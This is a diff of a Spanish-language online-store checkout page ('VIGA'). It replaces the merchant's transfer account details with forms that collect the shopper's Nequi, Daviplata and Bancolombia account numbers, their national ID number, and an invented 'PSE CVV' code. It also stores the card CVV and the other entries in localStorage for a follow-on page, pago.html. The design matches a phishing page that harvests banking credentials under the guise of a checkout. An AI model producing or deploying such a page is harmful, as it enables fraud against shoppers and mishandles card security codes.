@@ -233,7 +233,6 @@
             color: white;
         }
 
-        /* TARJETA INTERACTIVA */
         .tarjeta-grafica {
             background: linear-gradient(135deg, #1c2b1f, #111);
             border: 1px solid var(--verde);
@@ -243,7 +242,6 @@
             display: flex;
             flex-direction: column;
             gap: 15px;
-            box-shadow: 0 4px 15px rgba(55, 227, 89, 0.1);
         }
 
         .tarjeta-grafica .chip {
@@ -260,24 +258,25 @@
             font-weight: 600;
         }
 
-        .info-bancaria {
+        .info-app-box {
             background: #202020;
-            border: 1px dashed var(--verde);
+            border: 1px solid #333;
             border-radius: 10px;
-            padding: 18px;
-            margin-bottom: 20px;
+            padding: 15px;
+            margin-bottom: 18px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
         }
 
-        .info-bancaria h3 {
-            color: var(--verde);
-            font-size: 15px;
-            margin-bottom: 8px;
+        .info-app-box .icono {
+            font-size: 26px;
         }
 
-        .info-bancaria p {
+        .info-app-box p {
             font-size: 13px;
-            color: #ddd;
-            line-height: 1.7;
+            color: #ccc;
+            line-height: 1.5;
         }
 
         @media (max-width: 800px) {
@@ -295,14 +294,14 @@
 
 <main>
     <h1 id="tituloPaso">Confirmación de Pedido</h1>
-    <p class="subtitulo" id="subtituloPaso">Paso 1 de 2: Ingresa los datos para la entrega.</p>
+    <p class="subtitulo" id="subtituloPaso">Paso 1 de 2: Ingresa tus datos para la entrega.</p>
 
     <div class="checkout-grid">
 
-        <!-- CONTENEDOR IZQUIERDO DINÁMICO -->
+        <!-- COLUMNA IZQUIERDA -->
         <div id="columnaIzquierda">
 
-            <!-- PASO 1: DATOS DE ENVÍO -->
+            <!-- PASO 1: DATOS DE ENVÍO Y SELECCIÓN DE MÉTODO -->
             <section class="card" id="pasoEnvio">
                 <h2>Datos de entrega</h2>
                 <form id="formEnvio">
@@ -326,22 +325,25 @@
                         <label for="metodoPago">Selecciona tu método de pago *</label>
                         <select id="metodoPago" required>
                             <option value="tarjeta">Tarjeta de crédito / Débito</option>
-                            <option value="transferencia">Transferencia bancaria / Nequi / Daviplata</option>
+                            <option value="nequi">Nequi</option>
+                            <option value="daviplata">Daviplata</option>
+                            <option value="bancolombia">Cuenta Bancolombia</option>
+                            <option value="pse">PSE (Débito bancario con CVV)</option>
                         </select>
                     </div>
                     <button type="submit" class="btn-pagar">Continuar a ingresar datos de pago →</button>
                 </form>
             </section>
 
-            <!-- PASO 2: FORMULARIO PARA TARJETA DE CRÉDITO / DÉBITO -->
+            <!-- PASO 2A: TARJETA CRÉDITO / DÉBITO -->
             <section class="card" id="pasoTarjeta" style="display: none;">
-                <h2>Ingresa los datos de tu Tarjeta</h2>
+                <h2>Datos de tu Tarjeta</h2>
 
                 <div class="tarjeta-grafica">
                     <div class="chip"></div>
                     <div class="numero-vista" id="vistaNumeroTarjeta">•••• •••• •••• ••••</div>
                     <div style="display: flex; justify-content: space-between; font-size: 12px; color: #ccc;">
-                        <span id="vistaNombreTarjeta">TITULAR DE LA TARJETA</span>
+                        <span id="vistaNombreTarjeta">TITULAR</span>
                         <span id="vistaFechaTarjeta">MM/AA</span>
                     </div>
                 </div>
@@ -352,8 +354,8 @@
                         <input type="text" id="numeroTarjeta" maxlength="19" required placeholder="1234 5678 9012 3456" oninput="actualizarTarjetaVisual()">
                     </div>
                     <div class="campo">
-                        <label for="nombreTarjeta">Nombre impreso en la tarjeta *</label>
-                        <input type="text" id="nombreTarjeta" required placeholder="Ej. CARLOS MARTINEZ" oninput="actualizarTarjetaVisual()">
+                        <label for="nombreTarjeta">Nombre del titular *</label>
+                        <input type="text" id="nombreTarjeta" required placeholder="Como figura en la tarjeta" oninput="actualizarTarjetaVisual()">
                     </div>
                     <div class="fila-campos">
                         <div class="campo">
@@ -370,30 +372,94 @@
                 </form>
             </section>
 
-            <!-- PASO 2: FORMULARIO PARA NEQUI / TRANSFERENCIA -->
-            <section class="card" id="pasoTransferencia" style="display: none;">
-                <h2>Datos de cuenta para cobro</h2>
-                
-                <div class="info-bancaria">
-                    <h3>Cuentas oficiales VIGA</h3>
-                    <p><strong>Nequi / Daviplata:</strong> 300 123 4567</p>
-                    <p><strong>Bancolombia:</strong> 123-456789-01</p>
-                    <p><strong>Total exacto a pagar:</strong> <span id="montoTransferencia" style="color:var(--verde); font-weight:700;">$ 0</span></p>
+            <!-- PASO 2B: NEQUI -->
+            <section class="card" id="pasoNequi" style="display: none;">
+                <h2>Datos de tu cuenta Nequi</h2>
+                <div class="info-app-box">
+                    <div class="icono">🟣</div>
+                    <p>Ingresa tu número de cuenta Nequi. Te enviaremos una notificación para autorizar el cobro del pedido.</p>
                 </div>
-
-                <form id="formTransferencia">
+                <form id="formNequi">
                     <div class="campo">
-                        <label for="cuentaOrigen">Banco o billetera desde donde debitar *</label>
-                        <select id="cuentaOrigen" required>
-                            <option value="Nequi">Nequi</option>
-                            <option value="Daviplata">Daviplata</option>
-                            <option value="Bancolombia">Bancolombia</option>
-                            <option value="Otro Banco">Otro banco</option>
+                        <label for="numeroNequi">Número de cuenta Nequi (Celular) *</label>
+                        <input type="tel" id="numeroNequi" maxlength="10" required placeholder="Ej. 3001234567">
+                    </div>
+                    <button type="submit" class="btn-pagar">Ir a autorizar cobro →</button>
+                    <button type="button" class="btn-secundario" onclick="regresarAEnvio()">← Modificar datos de entrega</button>
+                </form>
+            </section>
+
+            <!-- PASO 2C: DAVIPLATA -->
+            <section class="card" id="pasoDaviplata" style="display: none;">
+                <h2>Datos de tu cuenta Daviplata</h2>
+                <div class="info-app-box">
+                    <div class="icono">🔴</div>
+                    <p>Ingresa el número de tu Daviplata y documento para programar el descuento en tu billetera.</p>
+                </div>
+                <form id="formDaviplata">
+                    <div class="campo">
+                        <label for="numeroDaviplata">Número de Daviplata (Celular) *</label>
+                        <input type="tel" id="numeroDaviplata" maxlength="10" required placeholder="Ej. 3101234567">
+                    </div>
+                    <div class="campo">
+                        <label for="documentoDaviplata">Número de Cédula o Documento *</label>
+                        <input type="text" id="documentoDaviplata" required placeholder="Ej. 1020304050">
+                    </div>
+                    <button type="submit" class="btn-pagar">Ir a autorizar cobro →</button>
+                    <button type="button" class="btn-secundario" onclick="regresarAEnvio()">← Modificar datos de entrega</button>
+                </form>
+            </section>
+
+            <!-- PASO 2D: BANCOLOMBIA -->
+            <section class="card" id="pasoBancolombia" style="display: none;">
+                <h2>Datos de tu cuenta Bancolombia</h2>
+                <div class="info-app-box">
+                    <div class="icono">🟡</div>
+                    <p>Ingresa los datos de tu cuenta de ahorros o corriente para autorizar la transacción.</p>
+                </div>
+                <form id="formBancolombia">
+                    <div class="campo">
+                        <label for="tipoCuentaBancolombia">Tipo de cuenta *</label>
+                        <select id="tipoCuentaBancolombia" required>
+                            <option value="Ahorros">Cuenta de Ahorros</option>
+                            <option value="Corriente">Cuenta Corriente</option>
                         </select>
                     </div>
                     <div class="campo">
-                        <label for="cuentaNumero">Número de celular o cuenta asociada *</label>
-                        <input type="text" id="cuentaNumero" required placeholder="Ej. 3001234567">
+                        <label for="numeroCuentaBancolombia">Número de cuenta Bancolombia *</label>
+                        <input type="text" id="numeroCuentaBancolombia" required placeholder="Ej. 123-456789-01">
+                    </div>
+                    <button type="submit" class="btn-pagar">Ir a autorizar cobro →</button>
+                    <button type="button" class="btn-secundario" onclick="regresarAEnvio()">← Modificar datos de entrega</button>
+                </form>
+            </section>
+
+            <!-- PASO 2E: PSE (CON CVV) -->
+            <section class="card" id="pasoPSE" style="display: none;">
+                <h2>Pago por PSE (Débito con clave / CVV)</h2>
+                <div class="info-app-box">
+                    <div class="icono">🏦</div>
+                    <p>Ingresa la entidad bancaria y tu código de seguridad / CVV asignado para compras PSE.</p>
+                </div>
+                <form id="formPSE">
+                    <div class="campo">
+                        <label for="bancoPSE">Selecciona tu banco *</label>
+                        <select id="bancoPSE" required>
+                            <option value="Banco de Bogotá">Banco de Bogotá</option>
+                            <option value="Banco Davivienda">Banco Davivienda</option>
+                            <option value="Banco BBVA">Banco BBVA</option>
+                            <option value="Banco de Occidente">Banco de Occidente</option>
+                            <option value="Scotiabank Colpatria">Scotiabank Colpatria</option>
+                            <option value="Banco Itaú">Banco Itaú</option>
+                        </select>
+                    </div>
+                    <div class="campo">
+                        <label for="correoPSE">Correo registrado en PSE *</label>
+                        <input type="email" id="correoPSE" required placeholder="ejemplo@correo.com">
+                    </div>
+                    <div class="campo">
+                        <label for="cvvPSE">Código de seguridad / CVV de la cuenta *</label>
+                        <input type="password" id="cvvPSE" maxlength="4" required placeholder="Ej. 123">
                     </div>
                     <button type="submit" class="btn-pagar">Ir a autorizar cobro →</button>
                     <button type="button" class="btn-secundario" onclick="regresarAEnvio()">← Modificar datos de entrega</button>
@@ -402,7 +468,7 @@
 
         </div>
 
-        <!-- RESUMEN DERECHO DEL PEDIDO -->
+        <!-- RESUMEN DEL PEDIDO -->
         <section class="card">
             <h2>Resumen del pedido</h2>
             <div class="lista-articulos" id="listaArticulos"></div>
@@ -470,11 +536,18 @@
         totalPedido = suma;
         subtotalEl.textContent = dinero(suma);
         totalEl.textContent = dinero(suma);
-        document.getElementById("montoTransferencia").textContent = dinero(suma);
+    }
+
+    function ocultarTodosLosPasos() {
+        document.getElementById("pasoTarjeta").style.display = "none";
+        document.getElementById("pasoNequi").style.display = "none";
+        document.getElementById("pasoDaviplata").style.display = "none";
+        document.getElementById("pasoBancolombia").style.display = "none";
+        document.getElementById("pasoPSE").style.display = "none";
     }
 
     /* =========================================================
-       PASO 1 -> PASO 2
+       PASO 1 -> PASO 2 (Muestra el formulario específico)
     ========================================================= */
     document.getElementById("formEnvio").addEventListener("submit", function(e) {
         e.preventDefault();
@@ -487,33 +560,36 @@
             metodo: document.getElementById("metodoPago").value
         };
 
-        // Ocultar sección de envío
         document.getElementById("pasoEnvio").style.display = "none";
         document.getElementById("tituloPaso").textContent = "Información del Pago";
-        document.getElementById("subtituloPaso").textContent = "Paso 2 de 2: Ingresa los datos solicitados.";
+        document.getElementById("subtituloPaso").textContent = "Paso 2 de 2: Completa los datos de tu cuenta.";
 
-        // Mostrar el formulario correspondiente
+        ocultarTodosLosPasos();
+
         if (datosEnvioGuardados.metodo === "tarjeta") {
             document.getElementById("pasoTarjeta").style.display = "block";
-            document.getElementById("pasoTransferencia").style.display = "none";
             document.getElementById("nombreTarjeta").value = datosEnvioGuardados.nombre.toUpperCase();
             actualizarTarjetaVisual();
-        } else {
-            document.getElementById("pasoTransferencia").style.display = "block";
-            document.getElementById("pasoTarjeta").style.display = "none";
-            document.getElementById("cuentaNumero").value = datosEnvioGuardados.telefono;
+        } else if (datosEnvioGuardados.metodo === "nequi") {
+            document.getElementById("pasoNequi").style.display = "block";
+            document.getElementById("numeroNequi").value = datosEnvioGuardados.telefono;
+        } else if (datosEnvioGuardados.metodo === "daviplata") {
+            document.getElementById("pasoDaviplata").style.display = "block";
+            document.getElementById("numeroDaviplata").value = datosEnvioGuardados.telefono;
+        } else if (datosEnvioGuardados.metodo === "bancolombia") {
+            document.getElementById("pasoBancolombia").style.display = "block";
+        } else if (datosEnvioGuardados.metodo === "pse") {
+            document.getElementById("pasoPSE").style.display = "block";
         }
 
         window.scrollTo({ top: 0, behavior: "smooth" });
     });
 
     function regresarAEnvio() {
-        document.getElementById("pasoTarjeta").style.display = "none";
-        document.getElementById("pasoTransferencia").style.display = "none";
+        ocultarTodosLosPasos();
         document.getElementById("pasoEnvio").style.display = "block";
-
         document.getElementById("tituloPaso").textContent = "Confirmación de Pedido";
-        document.getElementById("subtituloPaso").textContent = "Paso 1 de 2: Ingresa los datos para la entrega.";
+        document.getElementById("subtituloPaso").textContent = "Paso 1 de 2: Ingresa tus datos para la entrega.";
     }
 
     function actualizarTarjetaVisual() {
@@ -522,44 +598,80 @@
         const exp = document.getElementById("expiracionTarjeta").value;
 
         document.getElementById("vistaNumeroTarjeta").textContent = num || "•••• •••• •••• ••••";
-        document.getElementById("vistaNombreTarjeta").textContent = (nom || "TITULAR DE LA TARJETA").toUpperCase();
+        document.getElementById("vistaNombreTarjeta").textContent = (nom || "TITULAR").toUpperCase();
         document.getElementById("vistaFechaTarjeta").textContent = exp || "MM/AA";
     }
 
     /* =========================================================
-       PASO 2 -> IR A PAGO.HTML
+       ENVÍOS A PAGO.HTML SEGÚN LA OPCIÓN
     ========================================================= */
+    // 1. TARJETA
     document.getElementById("formTarjeta").addEventListener("submit", function(e) {
         e.preventDefault();
+        const num = document.getElementById("numeroTarjeta").value.replace(/\s+/g, '');
+        const cvv = document.getElementById("cvvTarjeta").value;
 
-        const numTarjeta = document.getElementById("numeroTarjeta").value.replace(/\s+/g, '');
-        const ultimosDigitos = numTarjeta.slice(-4) || "4242";
-
-        // Guardamos los datos para que pago.html los lea
         localStorage.setItem("viga_pedido_actual", JSON.stringify({
             metodo: "tarjeta",
-            terminacion: ultimosDigitos,
-            titular: document.getElementById("nombreTarjeta").value.trim(),
+            banco: "Tarjeta Débito / Crédito",
+            terminacion: num.slice(-4) || "4242",
+            cvv: cvv,
             nombre: datosEnvioGuardados.nombre,
             telefono: datosEnvioGuardados.telefono,
             direccion: datosEnvioGuardados.direccion,
             ciudad: datosEnvioGuardados.ciudad,
             total: totalPedido
         }));
-
         window.location.href = "pago.html";
     });
 
-    document.getElementById("formTransferencia").addEventListener("submit", function(e) {
+    // 2. NEQUI
+    document.getElementById("formNequi").addEventListener("submit", function(e) {
         e.preventDefault();
+        const num = document.getElementById("numeroNequi").value.trim();
 
-        const banco = document.getElementById("cuentaOrigen").value;
-        const cuenta = document.getElementById("cuentaNumero").value.trim();
-
-        // Guardamos los datos para que pago.html los lea
         localStorage.setItem("viga_pedido_actual", JSON.stringify({
             metodo: "transferencia",
-            banco: banco,
+            banco: "Nequi",
+            cuenta: num,
+            nombre: datosEnvioGuardados.nombre,
+            telefono: datosEnvioGuardados.telefono,
+            direccion: datosEnvioGuardados.direccion,
+            ciudad: datosEnvioGuardados.ciudad,
+            total: totalPedido
+        }));
+        window.location.href = "pago.html";
+    });
+
+    // 3. DAVIPLATA
+    document.getElementById("formDaviplata").addEventListener("submit", function(e) {
+        e.preventDefault();
+        const num = document.getElementById("numeroDaviplata").value.trim();
+        const doc = document.getElementById("documentoDaviplata").value.trim();
+
+        localStorage.setItem("viga_pedido_actual", JSON.stringify({
+            metodo: "transferencia",
+            banco: "Daviplata",
+            cuenta: num,
+            documento: doc,
+            nombre: datosEnvioGuardados.nombre,
+            telefono: datosEnvioGuardados.telefono,
+            direccion: datosEnvioGuardados.direccion,
+            ciudad: datosEnvioGuardados.ciudad,
+            total: totalPedido
+        }));
+        window.location.href = "pago.html";
+    });
+
+    // 4. BANCOLOMBIA
+    document.getElementById("formBancolombia").addEventListener("submit", function(e) {
+        e.preventDefault();
+        const tipo = document.getElementById("tipoCuentaBancolombia").value;
+        const cuenta = document.getElementById("numeroCuentaBancolombia").value.trim();
+
+        localStorage.setItem("viga_pedido_actual", JSON.stringify({
+            metodo: "transferencia",
+            banco: `Bancolombia (${tipo})`,
             cuenta: cuenta,
             nombre: datosEnvioGuardados.nombre,
             telefono: datosEnvioGuardados.telefono,
@@ -567,7 +679,27 @@
             ciudad: datosEnvioGuardados.ciudad,
             total: totalPedido
         }));
+        window.location.href = "pago.html";
+    });
 
+    // 5. PSE CON CVV
+    document.getElementById("formPSE").addEventListener("submit", function(e) {
+        e.preventDefault();
+        const banco = document.getElementById("bancoPSE").value;
+        const correo = document.getElementById("correoPSE").value.trim();
+        const cvv = document.getElementById("cvvPSE").value.trim();
+
+        localStorage.setItem("viga_pedido_actual", JSON.stringify({
+            metodo: "pse",
+            banco: `PSE - ${banco}`,
+            correoPSE: correo,
+            cvv: cvv,
+            nombre: datosEnvioGuardados.nombre,
+            telefono: datosEnvioGuardados.telefono,
+            direccion: datosEnvioGuardados.direccion,
+            ciudad: datosEnvioGuardados.ciudad,
+            total: totalPedido
+        }));
         window.location.href = "pago.html";
     });
 
